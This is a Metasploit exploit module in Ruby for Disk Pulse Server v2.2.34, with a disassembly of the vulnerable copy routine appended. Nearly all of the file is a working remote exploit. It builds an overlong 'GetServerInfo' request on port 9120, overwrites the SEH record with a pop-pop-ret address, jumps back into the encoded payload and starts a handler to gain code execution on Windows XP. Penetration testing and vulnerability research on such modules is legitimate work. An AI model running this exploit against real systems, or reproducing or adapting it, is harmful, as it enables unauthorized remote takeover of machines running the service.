require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Disk Pulse Server \'GetServerInfo\' Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow vulnerability found
					in libpal.dll of Disk Pulse Server v2.2.34. The overflow
					is triggered when sending an overly long 'GetServerInfo'
					request to the service listening on port 9120.
			},
			'Author'         => [ 'James Fitts' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'BID', '43919' ],
					[ 'URL', 'http://www.saintcorporation.com/cgi-bin/exploit_info/disk_pulse_getserverinfo' ],
					[ 'URL', 'http://www.coresecurity.com/content/disk-pulse-server-getserverinfo-request-buffer-overflow-exploit-10-5' ]
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space' => 300,
					'BadChars' => "\x00\x0a\x0d\x20",
					'DisableNops' => 'True',
					'StackAdjustment' => -3500,
					'Compat'	=>
						{
							'SymbolLookup' => 'ws2ord',
						}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 
						'Windows XP SP3 EN', 
							{ 
								# p/p/r 
								# libspp.dll
								'Ret' => 0x1006f71f,
								'Offset' => 303
							} 
					],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Oct 19 2010'))

		register_options([Opt::RPORT(9120)], self.class)
	end

	def exploit
		connect

		sploit =  "GetServerInfo"
		sploit << "\x41" * 8
		sploit << payload.encoded
		sploit << "\x42" * (303 - (8 + payload.encoded.length))
		sploit << generate_seh_record(target.ret)
		sploit << make_nops(4)
		sploit << "\xe9\xc4\xfe\xff\xff" # jmp $-311
		sploit << rand_text_alpha_upper(200)

		print_status("Trying target #{target.name}...")

		sock.put(sploit)

		handler
		disconnect
	end

end
__END__
0033C05C   55               PUSH EBP
0033C05D   8B6C24 1C        MOV EBP,DWORD PTR SS:[ESP+1C]
0033C061   3AC2             CMP AL,DL
0033C063   74 14            JE SHORT libpal.0033C079
0033C065   3C 0D            CMP AL,0D
0033C067   74 10            JE SHORT libpal.0033C079
0033C069   3C 0A            CMP AL,0A
0033C06B   74 0C            JE SHORT libpal.0033C079
0033C06D   41               INC ECX
0033C06E   88042F           MOV BYTE PTR DS:[EDI+EBP],AL
0033C071   47               INC EDI
0033C072   8A0431           MOV AL,BYTE PTR DS:[ECX+ESI]
0033C075   84C0             TEST AL,AL
0033C077  ^75 E8            JNZ SHORT libpal.0033C061
0033C079   C6042F 00        MOV BYTE PTR DS:[EDI+EBP],0
0033C07D   5D               POP EBP
0033C07E   5F               POP EDI
0033C07F   890B             MOV DWORD PTR DS:[EBX],ECX
0033C081   5E               POP ESI
0033C082   B8 01000000      MOV EAX,1
0033C087   5B               POP EBX
0033C088   C3               RETN